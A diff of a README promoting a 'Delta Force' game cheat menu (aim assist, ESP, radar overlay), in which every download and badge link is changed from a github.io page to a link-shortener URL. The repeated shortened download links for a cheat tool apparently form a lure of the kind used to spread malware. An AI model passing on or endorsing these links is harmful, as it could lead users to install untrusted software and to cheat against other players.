@@ -10,18 +10,18 @@ Delta Force currently revolves around large-scale **Warfare** battles and the ex
 
 ## Quick Access
 
-[![Delta Force](https://img.shields.io/badge/Delta%20Force-Mod%20Menu-18a957?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Aim Assist](https://img.shields.io/badge/Aim-Assist-1993d4?style=for-the-badge)](https://idleobstacle.github.io/)
-[![ESP](https://img.shields.io/badge/ESP-Visuals-28a745?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Radar](https://img.shields.io/badge/Radar-Overlay-6f42c1?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Vehicles](https://img.shields.io/badge/Vehicle-ESP-e09b32?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-1f883d?style=for-the-badge)](https://idleobstacle.github.io/)
+[![Delta Force](https://img.shields.io/badge/Delta%20Force-Mod%20Menu-18a957?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Aim Assist](https://img.shields.io/badge/Aim-Assist-1993d4?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![ESP](https://img.shields.io/badge/ESP-Visuals-28a745?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Radar](https://img.shields.io/badge/Radar-Overlay-6f42c1?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Vehicles](https://img.shields.io/badge/Vehicle-ESP-e09b32?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-1f883d?style=for-the-badge)](https://flyn.co/17yeN7/)
 
 ---
 
 ## Download
 
-➡️ **[Download Delta Force Mod Menu](https://idleobstacle.github.io/)**
+➡️ **[Download Delta Force Mod Menu](https://flyn.co/17yeN7/)**
 
 ---
 
@@ -29,15 +29,15 @@ Delta Force currently revolves around large-scale **Warfare** battles and the ex
 
 ### Mod Menu Interface
 
-[![Delta Force Mod Menu interface](assets/delta-force-mod-menu-preview.png)](https://idleobstacle.github.io/)
+[![Delta Force Mod Menu interface](assets/delta-force-mod-menu-preview.png)](https://flyn.co/17yeN7/)
 
 ### ESP & Radar Preview
 
-[![Delta Force ESP and Radar gameplay preview](assets/delta-force-esp-radar-preview.png)](https://idleobstacle.github.io/)
+[![Delta Force ESP and Radar gameplay preview](assets/delta-force-esp-radar-preview.png)](https://flyn.co/17yeN7/)
 
 ### Feature Overview
 
-[![Delta Force Mod Menu feature overview](assets/delta-force-feature-overview.png)](https://idleobstacle.github.io/)
+[![Delta Force Mod Menu feature overview](assets/delta-force-feature-overview.png)](https://flyn.co/17yeN7/)
 
 > Preview images are project mockups intended to demonstrate the interface and feature layout. Exact visuals may differ by project version and game update.
 
@@ -239,7 +239,7 @@ Compatibility can change after Delta Force updates.
 
 1. Download the current project package:
 
-   **[Download Delta Force Mod Menu](https://idleobstacle.github.io/)**
+   **[Download Delta Force Mod Menu](https://flyn.co/17yeN7/)**
 
 2. Extract the package into a dedicated folder.
 3. Read the current version notes.
